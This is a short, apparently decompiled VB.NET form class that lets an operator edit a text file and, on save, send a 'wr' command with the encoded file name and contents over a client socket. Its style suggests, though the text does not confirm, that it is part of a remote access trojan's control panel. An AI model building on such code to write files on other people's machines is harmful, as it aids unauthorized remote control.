Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class Note
    Public FNN As String
    Public SK As Client
    
    Private Sub TextBox1_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles TextBox1.TextChanged
        SaveToolStripMenuItem.Enabled = True
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SaveToolStripMenuItem.Click
        Dim strArray As String() = New String(5 - 1) {}
        strArray(0) = "wr"
        strArray(1) = ind.Y
        strArray(2) = FN.ENB(FNN)
        strArray(3) = ind.Y
        Dim box As TextBox = Me.TextBox1
        Dim text As String = box.Text
        box.Text = [text]
        strArray(4) = FN.ENB([text])
        Me.SK.Send(String.Concat(strArray))
        SaveToolStripMenuItem.Enabled = False
    End Sub

End Class